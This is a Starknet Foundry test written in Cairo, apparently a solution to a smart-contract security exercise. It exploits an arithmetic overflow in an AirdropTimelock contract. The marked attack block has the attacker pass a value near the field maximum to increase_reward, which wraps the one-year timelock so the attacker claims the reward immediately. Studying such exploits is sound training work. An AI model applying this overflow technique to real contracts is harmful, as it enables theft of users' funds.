use starknet::ContractAddress;
use snforge_std::{
    declare, ContractClassTrait, DeclareResultTrait, 
    start_cheat_caller_address, stop_cheat_caller_address, 
    start_cheat_block_timestamp
};
use openzeppelin_token::erc20::interface::{
    IERC20Dispatcher, IERC20DispatcherTrait
};

use arithmetic_flows::flowing_time::airdrop_timelock::{
    IAirdropTimelockDispatcher, IAirdropTimelockDispatcherTrait
};

fn one_ether() -> u256 {
    1_000_000_000_000_000_000
}

fn one_ether_felt() -> felt252 {
    1_000_000_000_000_000_000
}

const MAX_FELT: felt252 = 3618502788666131213697322783095070105623107215331596699973092056135872020480;

// 1 Year in Seoncds
const ONE_YEAR: felt252 = 31536000;

// 1.8.2024 00:00:00
const CURRENT_TIMESTAMP: felt252 = 1722459600;

// attacker timelock = 1753995600
// ONE_YEAR + CURRENT_TIMESTAMP

// Deploying the timelock contract
fn deploy_timelock(deployer: ContractAddress) -> (ContractAddress, IAirdropTimelockDispatcher, IERC20Dispatcher) {
    let contract_class = declare("AirdropTimelock").unwrap().contract_class();
    let (address, _) = contract_class.deploy(@array![deployer.into()]).unwrap();
    return (
        address, 
        IAirdropTimelockDispatcher { contract_address: address }, 
        IERC20Dispatcher { contract_address: address }
    );
}

#[test]
fn test_arithmetic_overflows_underflows_2() {
    // Accounts
    let deployer: ContractAddress = 'deployer'.try_into().unwrap();
    let alice: ContractAddress = 'alice'.try_into().unwrap();
    let bob: ContractAddress = 'bob'.try_into().unwrap();
    let attacker: ContractAddress = 'attacker'.try_into().unwrap();

    // Contracts deployment
    let (
        airdrop_address, 
        airdrop_dispatcher, 
        aidrop_token_dispatcher
    ) = deploy_timelock(deployer);

    // By default starknet foundry block time is 0, so we set it to the current time.
    start_cheat_block_timestamp(airdrop_address, CURRENT_TIMESTAMP.try_into().unwrap());

    // Add eligability for alice, bob, and attacker
    start_cheat_caller_address(airdrop_address, deployer);
    airdrop_dispatcher.set_reward_eligability(alice, one_ether_felt(), ONE_YEAR);
    airdrop_dispatcher.set_reward_eligability(bob, one_ether_felt(), ONE_YEAR);
    airdrop_dispatcher.set_reward_eligability(attacker, one_ether_felt(), ONE_YEAR);
    stop_cheat_caller_address(airdrop_address);
    
    let (
        attacker_reward, 
        attacker_timelock
    ) = airdrop_dispatcher.get_reward_details(attacker);
    println!("Attacker reward: {}", attacker_reward);
    println!("Attacker timelock: {}", attacker_timelock);

    let key_val: u256 = 
        3618502788666131213697322783095070105623107215331596699973092056134130528000;

    // TODO: Claim reward without waiting 1 year 👀
    // ATTACK START //
    start_cheat_caller_address(airdrop_address, attacker);
    airdrop_dispatcher.increase_reward(key_val);
    airdrop_dispatcher.claim_reward();
    stop_cheat_caller_address(airdrop_address);
    
    // ATTACK END //

    // Check that the attacker was able to withdraw the funds without waiting 3 days
    assert(aidrop_token_dispatcher.balance_of(attacker) >= one_ether(), 'Wrong balance');
    println!("Attacker balance is: {}", aidrop_token_dispatcher.balance_of(attacker));
}
